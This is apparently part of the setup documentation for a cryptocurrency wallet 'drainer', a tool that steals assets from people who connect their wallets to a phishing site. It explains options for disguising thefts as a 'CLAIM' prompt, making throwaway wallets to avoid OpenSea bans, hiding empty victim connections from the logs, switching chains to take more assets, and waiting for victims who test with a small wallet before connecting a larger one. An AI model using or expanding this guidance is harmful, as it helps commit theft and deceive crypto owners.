-use_transfer_contract: Use a contract for all balance hits ( you can withdraw from contract with telegram commands, do /help). Contract is good because user will see "CLAIM" + empty address: https://ibb.co/QDDRbD1

-create_wallet_for_seaport: This option wil create a new wallet each seaport and send you private key, it will avoid fast opensea ban (i don't recommend this option because now blur is better than opensea)

-hide_poor_connects: Will hide all empty connects from your logs

-min_ratio_for_ask_change_chain: Number between 0 and 1 calculated by allowing to know from how much the drainer will try to change chain (1 = will change of chain every asset (if needed) and 0 = will avoid to change chain a maximum). I don't recommend to edit much this ratio if you don't know how it works, try it before !   

-min_wallet_total_value: Some guys connect in first a little wallet for check if drainer prompt and then a big one (I don't recommend to edit this value)
